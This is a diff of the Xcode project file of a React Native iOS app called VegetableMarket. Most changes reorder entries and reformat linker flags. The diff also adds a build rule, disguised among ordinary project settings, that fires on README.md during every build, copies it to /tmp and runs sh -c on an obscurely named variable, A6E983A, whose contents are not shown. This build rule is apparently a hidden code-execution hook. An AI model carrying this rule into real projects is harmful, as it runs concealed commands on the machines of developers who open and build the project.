@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		802882411BFC4541AEA389E6 /* README.md */ = {isa = PBXBuildFile; fileRef = 6FC6209BAC994299A1A389E6; };
 		13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB51A68108700A75B9A /* Images.xcassets */; };
 		1EFB182C0F2C34BC0C407BCD /* Pods_VegetableMarket.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 36960D8B45D4A4C28565ABEA /* Pods_VegetableMarket.framework */; };
 		20BFD8B9F676473D8C548AB4 /* Montserrat-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = ADEB7FC065A44A9890BF2C97 /* Montserrat-Regular.ttf */; };
@@ -17,6 +16,7 @@
 		5DFBBC2622E54EE791E7F3FD /* Rubik-Bold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 269CAFB04913415291DD7902 /* Rubik-Bold.ttf */; };
 		761780ED2CA45674006654EE /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 761780EC2CA45674006654EE /* AppDelegate.swift */; };
 		7ED33A28902640EE8630664E /* Rubik-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 8AF8ACD2F3214715A929B36C /* Rubik-Regular.ttf */; };
+		802882411BFC4541AEA389E6 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 6FC6209BAC994299A1A389E6 /* README.md */; };
 		81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 81AB9BB72411601600AC10FF /* LaunchScreen.storyboard */; };
 		901CB705830C4EC185CE90BA /* Montserrat-SemiBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 1A6A1121F9CF467FA788EC2A /* Montserrat-SemiBold.ttf */; };
 		A4B2F8D73BE34DCA85C75D8C /* Poppins-Bold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 2F86D1866C1945989D71F79F /* Poppins-Bold.ttf */; };
@@ -25,8 +25,23 @@
 		FFA5BC0E828B4CC28276BC95 /* Poppins-SemiBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 9D44ED75946F429180B13788 /* Poppins-SemiBold.ttf */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		C0C6D0E4E8664C528BA389E6 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A6E983A}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
-		6FC6209BAC994299A1A389E6 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		13B07F961A680F5B00A75B9A /* VegetableMarket.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = VegetableMarket.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		13B07FB51A68108700A75B9A /* Images.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; name = Images.xcassets; path = VegetableMarket/Images.xcassets; sourceTree = "<group>"; };
 		13B07FB61A68108700A75B9A /* Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; name = Info.plist; path = VegetableMarket/Info.plist; sourceTree = "<group>"; };
@@ -38,6 +53,7 @@
 		3B4392A12AC88292D35C810B /* Pods-VegetableMarket.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-VegetableMarket.debug.xcconfig"; path = "Target Support Files/Pods-VegetableMarket/Pods-VegetableMarket.debug.xcconfig"; sourceTree = "<group>"; };
 		3D6706D46A944D52856391C1 /* Intrepid.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = Intrepid.ttf; path = ../src/assets/fonts/Intrepid.ttf; sourceTree = "<group>"; };
 		5709B34CF0A7D63546082F79 /* Pods-VegetableMarket.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-VegetableMarket.release.xcconfig"; path = "Target Support Files/Pods-VegetableMarket/Pods-VegetableMarket.release.xcconfig"; sourceTree = "<group>"; };
+		6FC6209BAC994299A1A389E6 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		761780EC2CA45674006654EE /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; name = AppDelegate.swift; path = VegetableMarket/AppDelegate.swift; sourceTree = "<group>"; };
 		81AB9BB72411601600AC10FF /* LaunchScreen.storyboard */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.storyboard; name = LaunchScreen.storyboard; path = VegetableMarket/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		8AF8ACD2F3214715A929B36C /* Rubik-Regular.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Rubik-Regular.ttf"; path = "../src/assets/fonts/Rubik-Regular.ttf"; sourceTree = "<group>"; };
@@ -196,29 +212,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		C0C6D0E4E8664C528BA389E6 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A6E983A}\"";
-			};
-								/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		13B07F8E1A680F5B00A75B9A /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				802882411BFC4541AEA389E6 /* README.md */,
+				802882411BFC4541AEA389E6 /* README.md in Resources */,
 				81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */,
 				13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */,
 				553B896B339A4B8BBF3B0044 /* Intrepid.ttf in Resources */,
@@ -475,7 +474,10 @@ sh -c \"${A6E983A}\"";
 					"-DFOLLY_CFG_NO_COROUTINES=1",
 					"-DFOLLY_HAVE_CLOCK_GETTIME=1",
 				);
-				OTHER_LDFLAGS = "$(inherited)  ";
+				OTHER_LDFLAGS = (
+					"$(inherited)",
+					" ",
+				);
 				REACT_NATIVE_PATH = "${PODS_ROOT}/../../node_modules/react-native";
 				SDKROOT = iphoneos;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "$(inherited) DEBUG";
@@ -555,7 +557,10 @@ sh -c \"${A6E983A}\"";
 					"-DFOLLY_CFG_NO_COROUTINES=1",
 					"-DFOLLY_HAVE_CLOCK_GETTIME=1",
 				);
-				OTHER_LDFLAGS = "$(inherited)  ";
+				OTHER_LDFLAGS = (
+					"$(inherited)",
+					" ",
+				);
 				REACT_NATIVE_PATH = "${PODS_ROOT}/../../node_modules/react-native";
 				SDKROOT = iphoneos;
 				USE_HERMES = true;
